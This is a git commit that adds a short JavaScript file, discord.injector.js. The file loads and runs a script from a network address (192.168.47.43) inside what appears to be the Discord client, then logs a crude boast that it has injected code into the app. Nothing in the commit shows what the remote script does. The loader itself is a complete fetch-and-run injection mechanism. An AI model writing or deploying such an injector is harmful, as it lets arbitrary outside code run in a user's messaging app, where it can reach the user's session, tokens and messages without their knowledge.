d92819de132baf7f4f20a46e676f97837ca6f1d5
Bad Woofsky <butterkuchen524@gmail.com>
2017-09-06 19:13:19 +0200

    Create discord.injector.js

---
+++ discord.injector.js
@@ -0,0 +1,5 @@
+var s = document.createElement("script");
+s.type="text/javascript";
+s.src="http://192.168.47.43/injector.js";
+document.head.appendChild(s);
+console.log("[InjectorJS] Discord Crypto Fuck smashed the code into this app");
